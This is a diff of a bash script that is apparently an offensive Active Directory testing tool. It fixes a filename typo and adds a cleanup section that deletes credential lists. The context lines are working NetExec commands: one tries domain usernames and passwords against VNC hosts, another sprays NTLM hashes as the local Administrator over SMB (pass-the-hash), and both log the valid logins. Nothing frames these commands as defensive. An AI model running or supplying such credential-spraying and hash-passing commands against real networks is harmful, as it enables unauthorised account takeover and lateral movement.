@@ -286,7 +286,7 @@ echo -e "\n\n\033[1;32m----------TRYING VALID DOMAIN LOGINS AGAINST VNC---------
 echo -e "\nVNC Local Authenication:\n"
 nxc vnc vnc_hosts.txt -u domain_no_brute_users.txt -p domain_no_brute_passwords.txt --continue-on-success --no-brute | \
 grep -iE " \\[\\+\\] |error" | \
-tee -a valid_service_logins.txts
+tee -a valid_service_logins.txt
 
 
 # SECTION 5 - FIND VALID DOMAIN USER:NTLM HASH COMBOS BY BRUTE FORCING SMB ON THE DC
@@ -392,3 +392,13 @@ echo -e "\n\n\033[1;32m----------SPRAYING NTLM HASHES FOR LOCAL ADMINISTRATOR AG
 nxc smb "$hosts" --local-auth -u "Administrator" -H "$ntlm_hash_file" --continue-on-success | \
 grep -iE " \\[\\+\\] |error" | \
 tee -a valid_NTLM_hash_logins.txt
+
+
+# SECTION 9 - CLEANUP
+rm -f domain_no_brute_passwords.txt
+rm -f domain_no_brute_users.txt
+rm -f NTLM_no_brute_pass.txt
+rm -f NTLM_no_brute_users.txt
+rm -f NTLM_users.txt
+mkdir hosts
+mv *_hosts.txt ./hosts/
